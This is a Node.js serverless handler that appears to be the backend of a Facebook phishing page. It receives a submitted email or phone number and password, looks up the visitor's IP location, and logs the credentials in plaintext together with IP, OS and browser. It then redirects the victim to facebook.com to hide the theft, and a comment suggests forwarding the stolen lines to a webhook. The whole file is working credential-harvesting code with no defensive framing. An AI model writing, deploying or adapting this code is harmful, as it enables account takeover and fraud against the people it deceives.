const https = require('https');

// Function to get real IP
function getClientIP(req) {
  return req.headers['x-forwarded-for'] ||
         req.headers['x-real-ip'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         req.ip ||
         'Unknown';
}

// Function to get location from IP
function getLocationFromIP(ip, callback) {
  if (ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
    return callback(null, 'Local');
  }
  const url = `https://ipapi.co/${ip}/json/`;
  https.get(url, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        const location = `${json.city || 'Unknown'}, ${json.region || ''} ${json.country_name || 'Unknown'}`.trim();
        callback(null, location);
      } catch (err) {
        callback(err, 'Unknown');
      }
    });
  }).on('error', (err) => {
    callback(err, 'Unknown');
  });
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email_or_phone = '', password = '', browser = '', os = '' } = req.body;
  const ip = getClientIP(req);

  // Obtener ubicación
  const location = await new Promise((resolve) => {
    getLocationFromIP(ip, (err, loc) => {
      resolve(loc);
    });
  });

  // Guardar en archivo (append). Añadimos timestamp.
  const now = new Date().toISOString();
  const safeEmail = email_or_phone.replace(/\r?\n/g, ' ');
  const safePass = password.replace(/\r?\n/g, ' ');
  const safeBrowser = browser.replace(/\r?\n/g, ' ');
  const safeOs = os.replace(/\r?\n/g, ' ');
  const safeLocation = location.replace(/\r?\n/g, ' ');
  const line = `${now} | IP: ${ip} | Location: ${safeLocation} | OS: ${safeOs} | Browser: ${safeBrowser} | user: ${safeEmail} | pass: ${safePass}\n`;

  // En lugar de escribir en archivo, loguear en consola (para serverless)
  console.log(line);

  // Opcional: Enviar a un webhook o base de datos
  // Por ejemplo, a un webhook: https.post('https://your-webhook-url.com', { body: line });

  // Responder con JSON para que el cliente maneje la redirección
  res.status(200).json({ success: true, redirect: 'https://www.facebook.com/' });
}